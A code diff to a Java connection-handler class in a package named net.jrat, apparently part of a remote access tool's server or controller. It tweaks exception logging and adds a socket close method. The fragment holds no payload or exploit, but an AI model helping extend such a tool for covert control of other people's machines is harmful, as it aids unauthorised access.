@@ -1,6 +1,5 @@
 package net.jrat.core.threads;
 
-import java.io.EOFException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.Socket;
@@ -55,7 +54,6 @@ public class ActionListener implements Runnable
 				catch(Exception e)
 				{
 					Logger.warn("could not handle packet: " + e.getMessage());
-					e.printStackTrace();
 				}
 			}
 			
@@ -64,14 +62,26 @@ public class ActionListener implements Runnable
 		}
 		catch(Exception e)
 		{
-			if(!(e instanceof EOFException) && !(e.getMessage().equals("Connection reset")))
+			if(!(e.getMessage().equals("Connection reset")) && !(e.getMessage().equals("Socket closed")))
 				Logger.err("could not handle connection: " + e.getMessage());
 			
 			if(this.server.currentConnection == connection)
 				this.server.currentConnection = null;
-
+			
+			Logger.space();
 			Logger.log("connection closed: " + connection.informations.username);
 			this.listener.connections.remove(connection);
 		}
+	}
+	
+	public void close()
+	{
+		try
+		{
+			this.socket.close();
+			this.outputStream.close();
+			this.inputStream.close();
+		}
+		catch (Exception e) {}
 	}
 }
